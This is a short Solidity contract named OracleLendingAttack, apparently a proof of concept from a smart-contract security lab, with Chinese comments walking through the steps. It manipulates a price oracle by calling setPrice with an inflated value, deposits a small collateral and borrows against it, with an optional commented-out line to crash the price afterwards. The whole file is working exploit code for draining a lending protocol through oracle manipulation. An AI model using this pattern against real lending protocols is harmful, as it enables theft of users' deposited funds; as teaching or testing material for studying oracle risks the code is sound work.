// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./LendingProtocol.sol";
import "../oracle/PriceOracle.sol";

contract OracleLendingAttack {
    LendingProtocol public lending;
    PriceOracle public oracle;

    constructor(address payable _lending, address _oracle) {
        lending = LendingProtocol(_lending);
        oracle = PriceOracle(_oracle);
    }

    function attack() external payable {
        // 1. 设置极高价格，先操控预言机
        oracle.setPrice(1000 ether); // 💥 人为抬高价格

        // 2. 存入很少的抵押
        lending.depositCollateral{value: msg.value}();

        // 3. 借出更多
        lending.borrow();

        // 4. 可选：再设置低价（模拟清算或逃逸）
        // oracle.setPrice(1);
    }

    receive() external payable {}
}